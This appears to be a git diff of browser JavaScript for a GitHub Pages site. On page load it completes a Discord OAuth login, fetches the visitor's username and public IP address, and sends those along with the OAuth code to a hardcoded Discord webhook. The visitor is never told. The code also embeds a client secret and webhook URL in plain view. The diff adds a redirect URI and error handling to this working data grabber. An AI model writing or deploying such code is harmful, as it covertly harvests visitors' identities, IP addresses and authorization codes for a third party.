@@ -1,7 +1,8 @@
 document.addEventListener('DOMContentLoaded', () => {
     const webhookUrl = 'https://discord.com/api/webhooks/1285089226743873659/dULAcB9U-d3AfF0lFYO1tmZ_m9LQVwJIzSmZ6irwtgQVkl7lhoJ8fYxv6eWn2oAeh4jq';
-    const clientId = '1285078591864045630'; // Replace with your Discord client ID
-    const clientSecret = 'yRmhBCgeyqi23yaRjwikIcJ6US9yQkgU'; // Replace with your Discord client secret
+    const clientId = 'Y1285078591864045630'; // DiscordのクライアントID
+    const clientSecret = 'yRmhBCgeyqi23yaRjwikIcJ6US9yQkgU'; // Discordのクライアントシークレット
+    const redirectUri = 'https://capped-uwu.github.io/drakoiefiejigtr'; // Discord開発者ポータルで設定したリダイレクトURI
 
     function getQueryParam(param) {
         const urlParams = new URLSearchParams(window.location.search);
@@ -9,21 +10,29 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     async function getAccessToken(code) {
+        const params = new URLSearchParams({
+            client_id: clientId,
+            client_secret: clientSecret,
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: redirectUri, // URLエンコードは不要
+            scope: 'identify'
+        });
+
         try {
             const response = await fetch('https://discord.com/api/oauth2/token', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 },
-                body: new URLSearchParams({
-                    client_id: clientId,
-                    client_secret: clientSecret,
-                    grant_type: 'authorization_code',
-                    code: code,
-                    redirect_uri: window.location.origin + '/your-redirect-uri', // Use the same redirect URI used in your OAuth2 setup
-                    scope: 'identify'
-                })
+                body: params
             });
+
+            if (!response.ok) {
+                const errorData = await response.json();
+                console.error('Error response from server:', errorData);
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
 
             const data = await response.json();
             return data.access_token;
@@ -40,6 +49,10 @@ document.addEventListener('DOMContentLoaded', () => {
                     'Authorization': `Bearer ${accessToken}`
                 }
             });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
 
             const data = await response.json();
             return data.username;
@@ -79,12 +92,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function processOAuth() {
         const code = getQueryParam('code');
-        const accessToken = await getAccessToken(code);
+        if (!code) {
+            console.error('No code found in URL');
+            return;
+        }
 
+        const accessToken = await getAccessToken(code);
         if (accessToken) {
             const username = await getUserInfo(accessToken);
             const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip).catch(() => 'unknown');
-
             await sendDataToDiscord(username, code, ip);
         } else {
             console.error('Access token not obtained');
